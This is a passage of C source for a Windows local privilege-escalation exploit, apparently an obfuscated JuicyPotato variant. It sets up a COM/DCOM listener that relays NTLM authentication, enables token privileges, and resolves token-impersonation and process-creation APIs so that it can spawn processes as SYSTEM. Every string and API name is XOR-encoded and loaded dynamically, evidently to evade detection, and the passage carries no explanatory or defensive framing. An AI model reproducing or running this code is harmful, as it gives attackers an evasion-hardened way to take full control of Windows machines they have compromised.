	 char  hid_shutdo_K1BpsoYKAuhH[] = {'\x36','\x2d','\x30','\x31','\x21','\x2a','\x32','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_aGHKm8qQjsUz = '\x45';
for(int i = 0; i < sizeof(hid_shutdo_K1BpsoYKAuhH) / sizeof(hid_shutdo_K1BpsoYKAuhH[0]); i++){
hid_shutdo_K1BpsoYKAuhH[i] = hid_shutdo_K1BpsoYKAuhH[i] ^ k_aGHKm8qQjsUz;
}
const int DEFAULT_BUFLEN = 4096;
	WSADATA wsaData;
	int iResult;
	struct addrinfo *result = NULL;
	struct addrinfo hints;
	int iSendResult;
	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf(hid_WSASta_bdWQ392ojb5W, iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	memset(dcom_port, 0, 12);
	wcstombs(dcom_port, g_port, 12);
	
	// printf("[+] Listening on port:%s\n", dcom_port);
	// Resolve the server address and port
	iResult = getaddrinfo(NULL, dcom_port, &hints, &result);

	if (iResult != 0) {
		printf(hid_getadd_MrUNb32fPZl6, iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	int optval = 1;
	setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&optval, sizeof(optval));

	if (ListenSocket == INVALID_SOCKET) {
		printf(hid_socket_WK8BDodL8dkA, WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	//printf("startCOMListener bindresult%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf(hid_bind_f_gNsvEpoqKTdi, WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf(hid_listen_ghREhz6mrnwJ, WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	//---- non block socket server

	timeval timeout = { 1, 0 };
	fd_set fds;
	FD_ZERO(&fds);
	FD_SET(ListenSocket, &fds);

	select(ListenSocket + 1, &fds, NULL, NULL, &timeout);
	if (FD_ISSET(ListenSocket, &fds))
	{
		ClientSocket = accept(ListenSocket, NULL, NULL);
		if (ClientSocket == INVALID_SOCKET) {
			printf(hid_accept_x9tCexDNVyh1, WSAGetLastError());
			closesocket(ListenSocket);
			WSACleanup();
			return 1;
		}
	}

	int ntlmLoc;
	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			
			if (!TEST_mode)
				printf(".", iResult);
			
			//check to see if the received packet has NTLM auth information
			processNtlmBytes(recvbuf, iResult);

			//Send all incoming packets to the WinRPC sockets "send queue" and wait for the WinRPC socket to put a packet into our "send queue"
			//put packet in winrpc_sendq
			rpcSendQ->push((char*)&iResult);
			rpcSendQ->push(recvbuf);

			//block and wait for a new item in our sendq
			int* len = (int*)comSendQ->wait_pop();
			sendbuf = comSendQ->wait_pop();

			//Check to see if this is a packet containing NTLM authentication information before sending
			processNtlmBytes(sendbuf, *len);

			//send the new packet sendbuf
			iSendResult = send(ClientSocket, sendbuf, *len, 0);

			if (iSendResult == SOCKET_ERROR) {
				printf(hid_COM____cAMk78UnBH2d, WSAGetLastError());
				exit(-11);
			}

			//Sometimes Windows likes to open a new connection instead of using the current one
			//Allow for this by waiting for 1s and replacing the ClientSocket if a new connection is incoming
			newConnection = checkForNewConnection(&ListenSocket, &ClientSocket);
		}
		else if (iResult == 0) {
			//connection closing...
			shutdown(ClientSocket, SD_SEND);
			WSACleanup();
			exit(-1);
		}
		else {
			if (!TEST_mode)
				printf(hid_COM____pWs62Cbg4tsO, WSAGetLastError());

			shutdown(ClientSocket, SD_SEND);
			WSACleanup();

			exit(-1);
		}

	} while (iResult > 0);

	// shutdown the connection since we're done
	iResult = shutdown(ClientSocket, SD_SEND);
	//	printf("startCOMListener iResult ComLisetner:%d\n", iResult);
	if (iResult == SOCKET_ERROR) {
		printf(hid_shutdo_K1BpsoYKAuhH, WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		exit(-1);
	}

	// cleanup
	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{
	
	 char  hid_Priv_L_ioxAvZp36ye4[] = {'\x15','\x37','\x2c','\x33','\x65','\x9','\x2a','\x2a','\x2e','\x30','\x35','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
 char k_zCNwsUbof0Oy = '\x45';
for(int i = 0; i < sizeof(hid_Priv_L_ioxAvZp36ye4) / sizeof(hid_Priv_L_ioxAvZp36ye4[0]); i++){
hid_Priv_L_ioxAvZp36ye4[i] = hid_Priv_L_ioxAvZp36ye4[i] ^ k_zCNwsUbof0Oy;
}

	 char  hid_Priv_A_a0KmeD5CnUDZ[] = {'\x15','\x37','\x2c','\x33','\x65','\x4','\x21','\x2f','\x30','\x36','\x31','\x65','\x3','\x4','\x9','\x16','\x0','\x4f','\x45'};
 char k_C39CgHIuhEmw = '\x45';
for(int i = 0; i < sizeof(hid_Priv_A_a0KmeD5CnUDZ) / sizeof(hid_Priv_A_a0KmeD5CnUDZ[0]); i++){
hid_Priv_A_a0KmeD5CnUDZ[i] = hid_Priv_A_a0KmeD5CnUDZ[i] ^ k_C39CgHIuhEmw;
}
	typedef bool(__sdtcall* _AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
	TCHAR  hid_Advapi_EY9fthHSHyD5[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_3RE8QA6hTNqP = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_EY9fthHSHyD5) / sizeof(hid_Advapi_EY9fthHSHyD5[0]); i++){
hid_Advapi_EY9fthHSHyD5[i] = hid_Advapi_EY9fthHSHyD5[i] ^ k_3RE8QA6hTNqP;
}

	HMODULE hid_hHandl_GpWqxwobU1eR = LoadLibrary(hid_Advapi_EY9fthHSHyD5);
	char  hid_Adjust_k90D4jzYyW63[] = {'\x4','\x21','\x2f','\x30','\x36','\x31','\x11','\x2a','\x2e','\x20','\x2b','\x15','\x37','\x2c','\x33','\x2c','\x29','\x20','\x22','\x20','\x36','\x45'};
char k_44OTQuzhFok7 = '\x45';
for(int i = 0; i < sizeof(hid_Adjust_k90D4jzYyW63) / sizeof(hid_Adjust_k90D4jzYyW63[0]); i++){
hid_Adjust_k90D4jzYyW63[i] = hid_Adjust_k90D4jzYyW63[i] ^ k_44OTQuzhFok7;
}

	_AdjustTokenPrivileges hid_Adjust_TnRA6MjxG0OH = (_AdjustTokenPrivileges) GetProcAddress(hid_hHandl_GpWqxwobU1eR, hid_Adjust_k90D4jzYyW63);
TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf(hid_Priv_L_ioxAvZp36ye4);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!hid_Adjust_TnRA6MjxG0OH(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf(hid_Priv_A_a0KmeD5CnUDZ);
		return FALSE;
	}

	return TRUE;
}


int wmain(int argc, wchar_t** argv)
{
	
	 char  hid________PZYeoFqjNIxG[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
 char k_v9mGDBzeFkSZ = '\x45';
for(int i = 0; i < sizeof(hid________PZYeoFqjNIxG) / sizeof(hid________PZYeoFqjNIxG[0]); i++){
hid________PZYeoFqjNIxG[i] = hid________PZYeoFqjNIxG[i] ^ k_v9mGDBzeFkSZ;
}

	 char  hid_Wrong__gGr2iA4TdRMP[] = {'\x12','\x37','\x2a','\x2b','\x22','\x65','\x4','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7f','\x65','\x60','\x36','\x4f','\x45'};
 char k_X0DtRYIuDA3T = '\x45';
for(int i = 0; i < sizeof(hid_Wrong__gGr2iA4TdRMP) / sizeof(hid_Wrong__gGr2iA4TdRMP[0]); i++){
hid_Wrong__gGr2iA4TdRMP[i] = hid_Wrong__gGr2iA4TdRMP[i] ^ k_X0DtRYIuDA3T;
}
BOOL brute = FALSE;

	strcpy(dcom_ip, hid________PZYeoFqjNIxG);
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
			case 't':
				++argv;
				--argc;
				processtype = argv[1];
				break;

			case 'p':
				++argv;
				--argc;
				processname = argv[1];
				break;

			case 'l':
				++argv;
				--argc;
				g_port = argv[1];
				break;
			
			case 'c':
				++argv;
				--argc;
				olestr = argv[1];
				break;

			case 'a':
				++argv;
				--argc;
				processargs = argv[1];
				break;

			case 'm':
				++argv;
				--argc;
				memset(dcom_ip, 0, 17);
				wcstombs(dcom_ip, argv[1], wcslen(argv[1]));
				break;

			case 'h':
				usage();
				exit(100);
				break;

			case 'k':
				++argv;
				--argc;
				rpcserver = argv[1];
				break;

			case 'n':
				++argv;
				--argc;
				rpcport = argv[1];
				break;

			case 'z':
				TEST_mode = TRUE;
				break;

			default:
				printf(hid_Wrong__gGr2iA4TdRMP, argv[1]);
				usage();
				exit(-1);
		}

		++argv;
		--argc;
	}

	if (g_port == NULL)
	{
		usage();
		exit(-1);
	}

	if ((processtype == NULL || processname == NULL) && !TEST_mode)
	{
		usage();
		exit(-1);
	}

	// Fallback to default BITS CLSID
	if (olestr == NULL)
		olestr = L"{4991d34b-80a1-4291-83b6-3328366b9097}";

	exit(Juicy(NULL, FALSE));
}

int Juicy(wchar_t *clsid, BOOL brute)
{
	
	 char  hid_Testin_PjJYWvnkegDY[] = {'\x11','\x20','\x36','\x31','\x2c','\x2b','\x22','\x65','\x60','\x16','\x65','\x60','\x16','\x4f','\x45'};
 char k_3fDMZpIjQolW = '\x45';
for(int i = 0; i < sizeof(hid_Testin_PjJYWvnkegDY) / sizeof(hid_Testin_PjJYWvnkegDY[0]); i++){
hid_Testin_PjJYWvnkegDY[i] = hid_Testin_PjJYWvnkegDY[i] ^ k_3fDMZpIjQolW;
}

	 char  hid______a_mdCqpHd3LoH3[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x24','\x30','\x31','\x2d','\x37','\x20','\x36','\x30','\x29','\x31','\x65','\x60','\x21','\x4f','\x45'};
 char k_tQjhKmBIROh8 = '\x45';
for(int i = 0; i < sizeof(hid______a_mdCqpHd3LoH3) / sizeof(hid______a_mdCqpHd3LoH3[0]); i++){
hid______a_mdCqpHd3LoH3[i] = hid______a_mdCqpHd3LoH3[i] ^ k_tQjhKmBIROh8;
}

	 wchar_t  hid_S_e_I__9THD15i1ljt5[] = {'\x16','\x20','\xc','\x28','\x35','\x20','\x37','\x36','\x2a','\x2b','\x24','\x31','\x20','\x15','\x37','\x2c','\x33','\x2c','\x29','\x20','\x22','\x20','\x45'};
 wchar_t k_T0GpkBjD6WfM = '\x45';
for(int i = 0; i < sizeof(hid_S_e_I__9THD15i1ljt5) / sizeof(hid_S_e_I__9THD15i1ljt5[0]); i++){
hid_S_e_I__9THD15i1ljt5[i] = hid_S_e_I__9THD15i1ljt5[i] ^ k_T0GpkBjD6WfM;
}

	 wchar_t  hid_S_e_A__IvFPmxGRhIuc[] = {'\x16','\x20','\x4','\x36','\x36','\x2c','\x22','\x2b','\x15','\x37','\x2c','\x28','\x24','\x37','\x3c','\x11','\x2a','\x2e','\x20','\x2b','\x15','\x37','\x2c','\x33','\x2c','\x29','\x20','\x22','\x20','\x45'};
 wchar_t k_Wvmlm0gNyDVj = '\x45';
for(int i = 0; i < sizeof(hid_S_e_A__IvFPmxGRhIuc) / sizeof(hid_S_e_A__IvFPmxGRhIuc[0]); i++){
hid_S_e_A__IvFPmxGRhIuc[i] = hid_S_e_A__IvFPmxGRhIuc[i] ^ k_Wvmlm0gNyDVj;
}

	 char  hid_____Er_HrI3Aob9dhzB[] = {'\x1e','\x68','\x18','\x65','\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
 char k_FqPJVkgM1XUi = '\x45';
for(int i = 0; i < sizeof(hid_____Er_HrI3Aob9dhzB) / sizeof(hid_____Er_HrI3Aob9dhzB[0]); i++){
hid_____Er_HrI3Aob9dhzB[i] = hid_____Er_HrI3Aob9dhzB[i] ^ k_FqPJVkgM1XUi;
}

	 char  hid_Error__6JJ7ozbUrtrG[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x22','\x20','\x31','\x31','\x2c','\x2b','\x22','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x65','\x31','\x3c','\x35','\x20','\x7f','\x65','\x20','\x37','\x37','\x2a','\x37','\x65','\x26','\x2a','\x21','\x20','\x65','\x75','\x3d','\x60','\x29','\x3d','\x4f','\x45'};
 char k_Pa1zEM3BHd8H = '\x45';
for(int i = 0; i < sizeof(hid_Error__6JJ7ozbUrtrG) / sizeof(hid_Error__6JJ7ozbUrtrG[0]); i++){
hid_Error__6JJ7ozbUrtrG[i] = hid_Error__6JJ7ozbUrtrG[i] ^ k_Pa1zEM3BHd8H;
}

	 char  hid______C_Ayl2MsGVY4GS[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_ARfChMCrK0P3 = '\x45';
for(int i = 0; i < sizeof(hid______C_Ayl2MsGVY4GS) / sizeof(hid______C_Ayl2MsGVY4GS[0]); i++){
hid______C_Ayl2MsGVY4GS[i] = hid______C_Ayl2MsGVY4GS[i] ^ k_ARfChMCrK0P3;
}

	 char  hid______C_75ifnTFR5UWh[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x65','\xa','\xe','\x4f','\x45'};
 char k_shEAdQ4KlFbR = '\x45';
for(int i = 0; i < sizeof(hid______C_75ifnTFR5UWh) / sizeof(hid______C_75ifnTFR5UWh[0]); i++){
hid______C_75ifnTFR5UWh[i] = hid______C_75ifnTFR5UWh[i] ^ k_shEAdQ4KlFbR;
}

	 wchar_t  hid_C______rGsA66c2sfCJ[] = {'\x6','\x7f','\x19','\x45'};
 wchar_t k_3odK0f3aSmvp = '\x45';
for(int i = 0; i < sizeof(hid_C______rGsA66c2sfCJ) / sizeof(hid_C______rGsA66c2sfCJ[0]); i++){
hid_C______rGsA66c2sfCJ[i] = hid_C______rGsA66c2sfCJ[i] ^ k_3odK0f3aSmvp;
}

	 char  hid______C_jTZP2bBP3O7q[] = {'\x4f','\x1e','\x68','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\x3','\x24','\x2c','\x29','\x20','\x21','\x65','\x31','\x2a','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x65','\x35','\x37','\x2a','\x26','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_PUqfMzl8KsyH = '\x45';
for(int i = 0; i < sizeof(hid______C_jTZP2bBP3O7q) / sizeof(hid______C_jTZP2bBP3O7q[0]); i++){
hid______C_jTZP2bBP3O7q[i] = hid______C_jTZP2bBP3O7q[i] ^ k_PUqfMzl8KsyH;
}

	 char  hid______C_SB0umAUOvbiQ[] = {'\x4f','\x1e','\x6e','\x18','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x65','\xa','\xe','\x4f','\x45'};
 char k_Ffak8CU5L5SI = '\x45';
for(int i = 0; i < sizeof(hid______C_SB0umAUOvbiQ) / sizeof(hid______C_SB0umAUOvbiQ[0]); i++){
hid______C_SB0umAUOvbiQ[i] = hid______C_SB0umAUOvbiQ[i] ^ k_Ffak8CU5L5SI;
}

	 char  hid_Waitin_jNCAIjyFm9iG[] = {'\x12','\x24','\x2c','\x31','\x2c','\x2b','\x22','\x65','\x23','\x2a','\x37','\x65','\x24','\x30','\x31','\x2d','\x6b','\x6b','\x6b','\x45'};
 char k_aDi7wC0hgrHs = '\x45';
for(int i = 0; i < sizeof(hid_Waitin_jNCAIjyFm9iG) / sizeof(hid_Waitin_jNCAIjyFm9iG[0]); i++){
hid_Waitin_jNCAIjyFm9iG[i] = hid_Waitin_jNCAIjyFm9iG[i] ^ k_aDi7wC0hgrHs;
}
	typedef SECURITY_STATUS(__stdcall* _QuerySecurityContextToken)(PCtxtHandle phContext, void **Token);
	TCHAR  hid_Secur__5ZByFZ95Gsu3[] = {'\x16','\x20','\x26','\x30','\x37','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_anN15ZLsiJDi = '\x45';
for(int i = 0; i < sizeof(hid_Secur__5ZByFZ95Gsu3) / sizeof(hid_Secur__5ZByFZ95Gsu3[0]); i++){
hid_Secur__5ZByFZ95Gsu3[i] = hid_Secur__5ZByFZ95Gsu3[i] ^ k_anN15ZLsiJDi;
}

	HMODULE hid_hHandl_Y9ebxtOJp8xu = LoadLibrary(hid_Secur__5ZByFZ95Gsu3);
	char  hid_QueryS_eFjnl19fTP7w[] = {'\x14','\x30','\x20','\x37','\x3c','\x16','\x20','\x26','\x30','\x37','\x2c','\x31','\x3c','\x6','\x2a','\x2b','\x31','\x20','\x3d','\x31','\x11','\x2a','\x2e','\x20','\x2b','\x45'};
char k_NKxWoFL8RB2r = '\x45';
for(int i = 0; i < sizeof(hid_QueryS_eFjnl19fTP7w) / sizeof(hid_QueryS_eFjnl19fTP7w[0]); i++){
hid_QueryS_eFjnl19fTP7w[i] = hid_QueryS_eFjnl19fTP7w[i] ^ k_NKxWoFL8RB2r;
}

	_QuerySecurityContextToken hid_QueryS_1hmeysvxRSc5 = (_QuerySecurityContextToken) GetProcAddress(hid_hHandl_Y9ebxtOJp8xu, hid_QueryS_eFjnl19fTP7w);
	typedef bool(__stdcall* _CreateProcessAsUserW)(HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
	TCHAR  hid_Advapi_L0z03wQuQJgj[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_mdmCm9cVW0LZ = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_L0z03wQuQJgj) / sizeof(hid_Advapi_L0z03wQuQJgj[0]); i++){
hid_Advapi_L0z03wQuQJgj[i] = hid_Advapi_L0z03wQuQJgj[i] ^ k_mdmCm9cVW0LZ;
}

	HMODULE hid_hHandl_ySM5K8XmJWdD = LoadLibrary(hid_Advapi_L0z03wQuQJgj);
	char  hid_Create_u5gogZsMT0Bt[] = {'\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x12','\x45'};
char k_ZUNwntYF8Wxm = '\x45';
for(int i = 0; i < sizeof(hid_Create_u5gogZsMT0Bt) / sizeof(hid_Create_u5gogZsMT0Bt[0]); i++){
hid_Create_u5gogZsMT0Bt[i] = hid_Create_u5gogZsMT0Bt[i] ^ k_ZUNwntYF8Wxm;
}

	_CreateProcessAsUserW hid_Create_wJpOZcQtl77v = (_CreateProcessAsUserW) GetProcAddress(hid_hHandl_ySM5K8XmJWdD, hid_Create_u5gogZsMT0Bt);
	typedef bool(__stdcall* _CreateProcessWithTokenW)(HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
	TCHAR  hid_Advapi_OlEiEg24CNAi[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_EpJBgbk5Fsnk = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_OlEiEg24CNAi) / sizeof(hid_Advapi_OlEiEg24CNAi[0]); i++){
hid_Advapi_OlEiEg24CNAi[i] = hid_Advapi_OlEiEg24CNAi[i] ^ k_EpJBgbk5Fsnk;
}

	HMODULE hid_hHandl_8ViowEdhdMFP = LoadLibrary(hid_Advapi_OlEiEg24CNAi);
	char  hid_Create_3FCSCIdtA6sI[] = {'\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x45'};
char k_7q2Pj97MZIkL = '\x45';
for(int i = 0; i < sizeof(hid_Create_3FCSCIdtA6sI) / sizeof(hid_Create_3FCSCIdtA6sI[0]); i++){
hid_Create_3FCSCIdtA6sI[i] = hid_Create_3FCSCIdtA6sI[i] ^ k_7q2Pj97MZIkL;
}

	_CreateProcessWithTokenW hid_Create_3lUoT0tH9oca = (_CreateProcessWithTokenW) GetProcAddress(hid_hHandl_8ViowEdhdMFP, hid_Create_3FCSCIdtA6sI);
	typedef bool(__stdcall* _DuplicateTokenEx)(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
	TCHAR  hid_Advapi_r7QnZta2lgPY[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_szXMWO7JVgk6 = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_r7QnZta2lgPY) / sizeof(hid_Advapi_r7QnZta2lgPY[0]); i++){
hid_Advapi_r7QnZta2lgPY[i] = hid_Advapi_r7QnZta2lgPY[i] ^ k_szXMWO7JVgk6;
}

	HMODULE hid_hHandl_jWf3Y2P9v1TI = LoadLibrary(hid_Advapi_r7QnZta2lgPY);
	char  hid_Duplic_fDNLlO84keOO[] = {'\x1','\x30','\x35','\x29','\x2c','\x26','\x24','\x31','\x20','\x11','\x2a','\x2e','\x20','\x2b','\x0','\x3d','\x45'};
char k_1Ut05yeF4pIn = '\x45';
for(int i = 0; i < sizeof(hid_Duplic_fDNLlO84keOO) / sizeof(hid_Duplic_fDNLlO84keOO[0]); i++){
hid_Duplic_fDNLlO84keOO[i] = hid_Duplic_fDNLlO84keOO[i] ^ k_1Ut05yeF4pIn;
}

	_DuplicateTokenEx hid_Duplic_5d8AJVxZKiZW = (_DuplicateTokenEx) GetProcAddress(hid_hHandl_jWf3Y2P9v1TI, hid_Duplic_fDNLlO84keOO);
	typedef bool(__stdcall* _GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
	TCHAR  hid_Advapi_F5EkIAn8o9i0[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_O3IQLBWwDKBD = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_F5EkIAn8o9i0) / sizeof(hid_Advapi_F5EkIAn8o9i0[0]); i++){
hid_Advapi_F5EkIAn8o9i0[i] = hid_Advapi_F5EkIAn8o9i0[i] ^ k_O3IQLBWwDKBD;
}

	HMODULE hid_hHandl_TJGZniDWFi8Y = LoadLibrary(hid_Advapi_F5EkIAn8o9i0);
	char  hid_GetTok_p6zo7zz7OtKi[] = {'\x2','\x20','\x31','\x11','\x2a','\x2e','\x20','\x2b','\xc','\x2b','\x23','\x2a','\x37','\x28','\x24','\x31','\x2c','\x2a','\x2b','\x45'};
char k_2Yd0i0AygJFt = '\x45';
for(int i = 0; i < sizeof(hid_GetTok_p6zo7zz7OtKi) / sizeof(hid_GetTok_p6zo7zz7OtKi[0]); i++){
hid_GetTok_p6zo7zz7OtKi[i] = hid_GetTok_p6zo7zz7OtKi[i] ^ k_2Yd0i0AygJFt;
}

	_GetTokenInformation hid_GetTok_Bp84CN6p7CzA = (_GetTokenInformation) GetProcAddress(hid_hHandl_TJGZniDWFi8Y, hid_GetTok_p6zo7zz7OtKi);
	TCHAR  hid_Advapi_sFJGAqiDimKu[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_kiHfVHbXH3XG = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_sFJGAqiDimKu) / sizeof(hid_Advapi_sFJGAqiDimKu[0]); i++){
hid_Advapi_sFJGAqiDimKu[i] = hid_Advapi_sFJGAqiDimKu[i] ^ k_kiHfVHbXH3XG;
}

	HMODULE hid_hHandl_AJCnmlFXQa4V = LoadLibrary(hid_Advapi_sFJGAqiDimKu);
	char  hid_GetTok_QVi2Ics4Ocod[] = {'\x2','\x20','\x31','\x11','\x2a','\x2e','\x20','\x2b','\xc','\x2b','\x23','\x2a','\x37','\x28','\x24','\x31','\x2c','\x2a','\x2b','\x45'};
char k_hL6Y64DdOvI0 = '\x45';
for(int i = 0; i < sizeof(hid_GetTok_QVi2Ics4Ocod) / sizeof(hid_GetTok_QVi2Ics4Ocod[0]); i++){
hid_GetTok_QVi2Ics4Ocod[i] = hid_GetTok_QVi2Ics4Ocod[i] ^ k_hL6Y64DdOvI0;
}

	_GetTokenInformation hid_GetTok_BoW81jjJ6wpD = (_GetTokenInformation) GetProcAddress(hid_hHandl_AJCnmlFXQa4V, hid_GetTok_QVi2Ics4Ocod);
	typedef bool(__stdcall* _OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
	TCHAR  hid_Advapi_ZeGzvGxKxJMN[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_RLSRmvyFsoxw = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_ZeGzvGxKxJMN) / sizeof(hid_Advapi_ZeGzvGxKxJMN[0]); i++){
hid_Advapi_ZeGzvGxKxJMN[i] = hid_Advapi_ZeGzvGxKxJMN[i] ^ k_RLSRmvyFsoxw;
}

	HMODULE hid_hHandl_2r9jRB2cNNjv = LoadLibrary(hid_Advapi_ZeGzvGxKxJMN);
	char  hid_OpenPr_H3bwOcRFgxSE[] = {'\xa','\x35','\x20','\x2b','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x11','\x2a','\x2e','\x20','\x2b','\x45'};
char k_iZIPAEr7iNfR = '\x45';
for(int i = 0; i < sizeof(hid_OpenPr_H3bwOcRFgxSE) / sizeof(hid_OpenPr_H3bwOcRFgxSE[0]); i++){
hid_OpenPr_H3bwOcRFgxSE[i] = hid_OpenPr_H3bwOcRFgxSE[i] ^ k_iZIPAEr7iNfR;
}

	_OpenProcessToken hid_OpenPr_G6tw1zF1pWUq = (_OpenProcessToken) GetProcAddress(hid_hHandl_2r9jRB2cNNjv, hid_OpenPr_H3bwOcRFgxSE);
	TCHAR  hid_Advapi_bd9GtYbp7aQz[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_44XaTDHPbQDl = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_bd9GtYbp7aQz) / sizeof(hid_Advapi_bd9GtYbp7aQz[0]); i++){
hid_Advapi_bd9GtYbp7aQz[i] = hid_Advapi_bd9GtYbp7aQz[i] ^ k_44XaTDHPbQDl;
}

	HMODULE hid_hHandl_DZwJ0DawW3Ue = LoadLibrary(hid_Advapi_bd9GtYbp7aQz);
